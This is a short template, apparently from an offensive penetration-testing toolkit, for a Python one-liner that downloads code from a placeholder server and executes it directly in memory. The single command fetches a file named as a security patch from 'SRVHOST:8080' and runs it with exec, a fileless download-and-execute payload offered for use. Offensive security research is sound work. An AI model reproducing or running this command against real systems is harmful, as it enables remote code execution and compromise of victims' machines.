# python template | Author: r00t-3xp10it
# download/execute python direct into ram
# use 'python -c' to execute the python code (2 times press)
# ---
python -c "import urllib2; r = urllib2.urlopen('http://SRVHOST:8080/SecPatch'); exec(r.read());"

